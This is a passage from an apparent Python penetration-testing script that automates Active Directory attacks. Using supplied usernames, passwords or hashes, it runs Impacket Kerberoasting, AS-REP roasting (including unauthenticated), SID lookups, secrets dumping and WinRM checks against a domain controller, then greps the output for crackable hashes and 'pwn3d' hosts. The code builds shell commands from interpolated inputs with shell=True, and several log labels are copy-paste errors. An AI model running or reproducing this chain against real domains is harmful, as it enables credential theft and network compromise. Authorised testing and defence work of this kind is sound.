        f.write(f"{GREEN}Secrets Dump{RESET}\n\n")
    subprocess.call([f"{isech} >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def IMPKP():
    print(f"{YELLOW}Running Impacket Kerberoasting with Username {USERNAME} and Password {PASSWORD}{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Kerberoasting{RESET}\n\n")
    subprocess.call([f"{ispn} >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def IMPKH():
    print(f"{YELLOW}Running Impacket Kerberoasting with Username {USERNAME} and Hash {HASH}{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Kerberoasting{RESET}\n\n")
    subprocess.call([f"{ispnh} >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def IMPASREPP():
    print(f"{YELLOW}Running Impacket AsRepRoast with Username {USERNAME} and Password {PASSWORD}{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}AsRepRoast{RESET}\n\n")
    subprocess.call([f"{inp} >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def IMPASREPH():
    print(f"{YELLOW}Running Impacket AsRepRoast with Username {USERNAME} and Hash {HASH}{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}AsRepRoast{RESET}\n\n")
    subprocess.call([f"{inph} >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def IMPSIDP():
    print(f"{YELLOW}Running Impacket lookupsid with Username {USERNAME} and Password {PASSWORD}{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}AsRepRoast{RESET}\n\n")
    subprocess.call([f"{isid} >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def IMPSIDH():
    print(f"{YELLOW}Running Impacket lookupsid with Username {USERNAME} and Hash {HASH}{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}AsRepRoast{RESET}\n\n")
    subprocess.call([f"{isidh} >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def IMPAUSERSN():
    print(f"{YELLOW}Running Impacket AsRepRoast NULL with usersfile {USERS}{RESET}\n\n")
    subprocess.call([f"GetNPUsers.py -no-pass -usersfile {USERS} {DOMAIN}/ >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def KRB5ASREP():
    print(f"{YELLOW}Looking for ASREP hashes{RESET}")
    subprocess.call([f"cat {DOMAIN}{fi}.txt | grep -i 'krb5asrep' >> asrephashes.txt"], shell=True)
    if os.path.getsize("asrephashes.txt") > 0:
        print(f"{CYAN}AsRepRoasting hashes found{RESET}")
        with open (f"asrephashes.txt", "r") as f:
            content = f.read()
            print(content)
    else:
        print(f"{GREEN}No hashes found{RESET}")

def WINRMPR():
    print(f"{YELLOW}Checking for WINRM with Username {USERNAME} and Password {PASSWORD}{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}WINRM with username and password{RESET}\n\n")
    subprocess.call([f"{cw} {crup} >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def WINRMHR():
    print(f"{YELLOW}Checking for WINRM with Username {USERNAME} and Password {PASSWORD}{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}WINRM with username and password{RESET}\n\n")
    subprocess.call([f"{cw} {cruh} >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def REMINDER():
    print(f"{YELLOW}Reminder you have the following{RESET}")
    print(f"{GREEN}Read and Write shares if any{RESET}")
    subprocess.call([f"cat {DOMAIN}{fi}.txt | grep -ia READ >> {DOMAIN}{fi}.txt"], shell=True)
    print(f"{GREEN}Pwned if any{RESET}")
    subprocess.call([f"cat {DOMAIN}{fi}.txt | grep -ia pwn3d >> {DOMAIN}{fi}.txt"], shell=True)
    print(f"{GREEN}Vulnerable if any{RESET}")
    subprocess.call([f"cat {DOMAIN}{fi}.txt | grep -ia vulnerable >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)


def main():
    if TOOL is not False:
        PRE(); exit();
    if NULL is not False and RHOST != None:
        NULLR(); LDAPDOMAINDUMPN(); FTPN(); VNCN(); LDAPSEARCHN(); IMPAUSERSN(); KRB5ASREP(); REMINDER();
    if NULL is not False and FILE != None:
        NULLR(); FTPN(); VNCN(); LDAPSEARCHN();
    if USERNAME != None and PASSWORD != None and RHOST != None:
        if DC == None:
            print(f"{RED}Need DC IP to run attacks{RESET}")
        else:
            SMBP(); CERTP(); LDAPDOMAINDUMPR(); LDAPP(); MSSQLPR(); WINRMPR(); FTPP(); RDPP(); VNCRP(); SSHRP(); WMIRP(); IMPKP(); IMPASREPP(); IMPSIDP(); KRB5ASREP(); REMINDER();
    if USERNAME != None and PASSWORD != None and FILE != None and NULL == False and ADMIN == False:
        if DC == None:
            print(f"{RED}Need DC IP to run attacks{RESET}")
        else:
            SMBP(); CERTP(); LDAPDOMAINDUMPR(); LDAPP(); MSSQLPR(); WINRMPR(); FTPP(); RDPP(); VNCRP(); SSHRP(); WMIRP(); IMPKP(); IMPASREPP(); IMPSIDP(); KRB5ASREP(); REMINDER();
    if USERNAME != None and HASH != None and RHOST != None and NULL == False and ADMIN == False:
        if DC == None:
            print(f"{RED}Need DC IP to run attacks{RESET}")
        else:
            SMBH(); CERTH(); LDAPDOMAINDUMPH(); LDAPH(); MSSQLHR(); WINRMHR(); FTPH(); RDPH(); VNCRH(); SSHRH(); WMIRH(); IMPKH(); IMPASREPH(); IMPSIDH(); KRB5ASREP(); REMINDER();
    if USERNAME != None and HASH != None and FILE != None and NULL == False and ADMIN == False:
        if DC == None:
            print(f"{RED}Need DC IP to run attacks{RESET}")
        else:
            SMBH(); CERTH(); LDAPDOMAINDUMPH(); LDAPH(); MSSQLHR(); WINRMHR(); FTPH(); RDPH(); VNCRH(); SSHRH(); WMIRH(); IMPKH(); IMPASREPH(); IMPSIDH(); KRB5ASREP(); REMINDER();
    if ADMIN is not False and RHOST != None and PASSWORD != None:
        if DC == None:
            print(f"{RED}Need DC IP to run attacks as administrator{RESET}")
        else:
            SMBAPR(); MSSQLPR(); IMPAP(); REMINDER();
    if ADMIN is not False and RHOST != None and HASH != None:
        print(f"{YELLOW}If you are an admin but want to run regular attacks instead of admin only attacks, do not use -A{RESET}\n\n")
        if DC == None:
            print(f"{RED}Need DC IP to run attacks as administrator{RESET}")  
        else:
            SMBAHR(); MSSQLHR(); IMPAH(); REMINDER();
    if ADMIN is not False and FILE != None and PASSWORD != None:
        print(f"{YELLOW}If you are an admin but want to run regular attacks instead of admin only attacks, do not use -A{RESET}\n\n")
        if DC == None:
            print(f"{RED}Need DC IP to run attacks as administrator{RESET}")
        else:
            SMBAPR(); MSSQLPR(); IMPAP(); REMINDER();
    if ADMIN is not False and FILE != None and HASH != None:
        print(f"{YELLOW}If you are an admin but want to run regular attacks instead of admin only attacks, do not use -A{RESET}\n\n")
        if DC == None:
            print(f"{RED}Need DC IP to run attacks as administrator{RESET}")  
        else:
            SMBAHR(); MSSQLHR(); IMPAH(); REMINDER();
    if ADMIN is not False and DCFILE != None and PASSWORD != None:
        SMBAPR(); MSSQLPR(); IMPAP(); REMINDER();
    if ADMIN is not False and DCFILE != None and HASH != None:
        print(f"{YELLOW}If you are an admin but want to run regular attacks instead of admin only attacks, do not use -A{RESET}\n\n")
        SMBAHR(); MSSQLHR(); IMPAH(); REMINDER();
    if ADMIN is not False and DCFILE != None and PASSWORD != None:
        print(f"{YELLOW}If you are an admin but want to run regular attacks instead of admin only attacks, do not use -A{RESET}\n\n")
        SMBAPR(); MSSQLPR(); IMPAP(); REMINDER();
    if ADMIN is not False and DCFILE != None and HASH != None:
        print(f"{YELLOW}If you are an admin but want to run regular attacks instead of admin only attacks, do not use -A{RESET}\n\n")
        SMBAHR(); MSSQLHR(); IMPAH(); REMINDER();


if __name__ == '__main__':
    main()
